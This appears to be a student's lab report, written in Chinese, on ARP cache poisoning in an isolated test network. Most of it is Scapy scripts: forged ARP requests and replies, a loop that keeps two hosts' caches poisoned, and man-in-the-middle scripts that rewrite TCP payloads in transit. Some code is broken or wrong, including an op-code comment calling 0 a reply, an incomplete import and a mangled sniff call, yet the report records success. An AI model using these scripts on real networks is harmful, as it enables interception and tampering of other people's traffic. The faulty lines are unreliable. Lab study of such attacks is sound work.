# ARP

## 任务1

### 1.A

```python
#!/usr/bin/env python3
from scapy.all import *

ether = Ether()
arp = ARP()
arp.op = 1
arp.psrc = '10.9.0.6'
arp.pdst = '10.9.0.5'

packet = ether/arp
sendp(packet)
```

![image-20260317203716041](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260317203716041.png)

可以看到 10.9.0.6（B的IP）的 MAC地址为M的MAC地址，攻击成功

### 1.B

```python
#!/usr/bin/env python3
from scapy.all import *

ether = Ether()
arp = ARP()
arp.op = 0  #1 for request， 0 for reply
arp.psrc = '10.9.0.6'
arp.pdst = '10.9.0.5'

packet = ether/arp
sendp(packet)
```

#### 情景 1：B 的 IP 地址已经存在于 A 的缓存中

![image-20260317203914788](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260317203914788.png)

攻击失败

#### 情景 2：B 的 IP 地址未出现在 A 的缓存中

![image-20260317203546002](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260317203546002.png)

攻击失败

### 1.C

```python
#!/usr/bin/env python3
from scapy.all import *

ether = Ether()
arp = ARP()
arp.op = 1
arp.psrc = '10.9.0.6'
arp.pdst = arp.psrc
ether.dst = 'ff:ff:ff:ff:ff:ff' #broadcast
arp.hwdst = ether.dst

packet = ether/arp
sendp(packet)
```

#### B 的 IP 地址已经存在于 A 的缓存中

![image-20260317204843089](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260317204843089.png)

攻击成功，10.9.0.6的MAC被修改了

#### 情景 2：B 的 IP 地址未出现在 A 的缓存中

![image-20260317204935191](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260317204935191.png)

攻击失败

说明reply和gratuitous包只能修改不能添加

## 任务2

```python
#!/usr/bin/env python3
from scapy.all import *
from time import *

ether = Ether()
arpA = ARP()
arpA.op = 1
arpA.psrc = '10.9.0.6'
arpA.pdst = '10.9.0.5'
arpB = ARP()
arpB.op = 1
arpB.psrc = '10.9.0.5'
arpB.pdst = '10.9.0.6'

t = 1 #auto attack

while(t):
    print(f"......{t}......")
    t += 1
    packetA = ether/arpA
    packetB = ether/arpB
    sendp(packetA)
    sendp(packetB)
    sleep(5) # send every 5 seconds
```



### 步骤1（**发起 ARP 缓存中毒攻击）**：

![image-20260317210301754](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260317210301754.png)

攻击成功

### 步骤2

使用`sysctl net.ipv4.ip_forward=0`后

![image-20260317210537547](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260317210537547.png)

AB之间ping无法收到回复

### 步骤3

将`sysctl net.ipv4.ip_forward=1`后

![image-20260317210716788](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260317210716788.png)

M转发了AB之间的报文

### 步骤4

```python
#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
         # 根据捕获的数据包创建一个新的数据包。
         # 1) 我们需要删除 IP 和 TCP 头部的校验和，
         #    因为我们的修改会使它们无效。
         #    Scapy 会在这些字段缺失时重新计算它们。
         # 2) 我们还删除了原始的 TCP 有效载荷。

         newpkt = IP(bytes(pkt[IP]))
         del(newpkt.chksum)
         del(newpkt[TCP].payload)
         del(newpkt[TCP].chksum)

         #################################################################
         # 根据旧的有效载荷构建新的有效载荷。
         # 你需要实现这部分代码。

         if pkt[TCP].payload:
             data = pkt[TCP].payload.load  # 原始的有效载荷数据
             newdata = b'Z' * len(data)   # 修改为相同长度的Z

             send(newpkt/newdata)
         else:
             send(newpkt)
         ################################################################

    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
         # 根据捕获的数据包创建一个新的数据包
         # 不进行任何修改。

         newpkt = IP(bytes(pkt[IP]))
         del(newpkt.chksum)
         del(newpkt[TCP].chksum)
         send(newpkt)

f = f'eth0', filter=f'ether src {MAC_A} or ether src {MAC_B}' #只检测自身发出的数据包之外的TCP数据包
pkt = sniff(iface=f, prn=spoof_pkt)
```

![image-20260317215504541](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260317215504541.png)

成功

## 任务3

```python
#!/usr/bin/env python3
from scapy.all import *
from re import

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
         # 根据捕获的数据包创建一个新的数据包。
         # 1) 我们需要删除 IP 和 TCP 头部的校验和，
         #    因为我们的修改会使它们无效。
         #    Scapy 会在这些字段缺失时重新计算它们。
         # 2) 我们还删除了原始的 TCP 有效载荷。

         newpkt = IP(bytes(pkt[IP]))
         del(newpkt.chksum)
         del(newpkt[TCP].payload)
         del(newpkt[TCP].chksum)

         #################################################################
         # 根据旧的有效载荷构建新的有效载荷。
         # 你需要实现这部分代码。

         if pkt[TCP].payload:
             data = pkt[TCP].payload.load  # 原始的有效载荷数据
             newdata = data.replace(b'Wang',b'AAAA')  #将姓氏修改为相应长度的A
             newpkt[IP].len = pkt[IP].len + len(newdata) - len(data)

             send(newpkt/newdata)
         else:
             send(newpkt)
         ################################################################

    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
         # 根据捕获的数据包创建一个新的数据包
         # 不进行任何修改。

         newpkt = IP(bytes(pkt[IP]))
         del(newpkt.chksum)
         del(newpkt[TCP].chksum)
         send(newpkt)

f = f'eth0', filter=f'ether src {MAC_A} or ether src {MAC_B}'
pkt = sniff(iface=f, prn=spoof_pkt)
```

![image-20260318173824052](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260318173824052.png)

成功
